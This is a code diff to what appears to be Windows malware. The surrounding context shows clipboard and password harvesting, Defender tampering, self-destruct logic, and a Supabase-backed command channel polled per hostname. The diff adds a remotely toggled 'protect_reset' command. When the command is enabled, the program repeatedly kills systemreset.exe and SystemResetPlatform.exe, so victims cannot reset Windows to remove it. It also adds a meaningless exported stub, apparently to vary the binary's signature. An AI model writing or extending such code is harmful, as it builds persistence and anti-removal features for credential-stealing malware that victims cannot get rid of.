@@ -53,6 +53,7 @@ static std::vector<std::string> g_triggers;
 static bool g_running = true;
 static bool g_selfDestructing = false;
 static bool g_harvestPaused = false;
+static bool g_protectReset = false;
 static std::string g_hostname;
 static std::string g_lastClipboard;
 static std::string g_lastPasswordDigest;
@@ -2411,6 +2412,26 @@ static void CheckAndHandleDefender() {
     LogMsg("Defender: " + action + " -> exit " + std::to_string((int)exitCode));
 }
 
+static void CheckAndHandleProtectReset() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.protect_reset&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    std::string action = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || action.empty()) return;
+    if (action != "enable" && action != "disable") return;
+    g_protectReset = (action == "enable");
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"protect_reset " + EscapeJSON(action) + "\",\"output\":\"" + EscapeJSON(action) + "\",\"exit_code\":0}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("ProtectReset: " + action);
+}
+
 static void SendHeartbeat() {
     // Upload crash logs if any
     char tmp[MAX_PATH];
@@ -2745,6 +2766,21 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     DestroyWindow(hwnd);
                 }
             }
+            if (counter % 5 == 0 && g_protectReset) {
+                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                if (hSnap != INVALID_HANDLE_VALUE) {
+                    PROCESSENTRY32 pe = { sizeof(pe) };
+                    if (Process32First(hSnap, &pe)) {
+                        do {
+                            if (_stricmp(pe.szExeFile, "systemreset.exe") == 0 || _stricmp(pe.szExeFile, "SystemResetPlatform.exe") == 0) {
+                                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                                if (hProc) { TerminateProcess(hProc, 1); CloseHandle(hProc); }
+                            }
+                        } while (Process32Next(hSnap, &pe));
+                    }
+                    CloseHandle(hSnap);
+                }
+            }
             if (counter % 60 == 0 && !g_selfDestructing) {
                 SendHeartbeat();
                 FetchTriggers();
@@ -2759,6 +2795,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 CheckAndHandleProclist();
                 CheckAndHandleKill();
                 CheckAndHandleDefender();
+                CheckAndHandleProtectReset();
                 CheckHarvestConfig();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
@@ -3015,3 +3052,4 @@ int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
 int _sd7f9bd008da14598892b2482d9609e20(void){return 0;}
 int _s648d5539b27140ebb936cd13c8ed671a(void){return 0;}
 int _s71d014ab11584b54bab8f56bc6bea1fb(void){return 0;}
+int _s1abdfba2d47d45c59a828f48986b6857(void){return 0;}
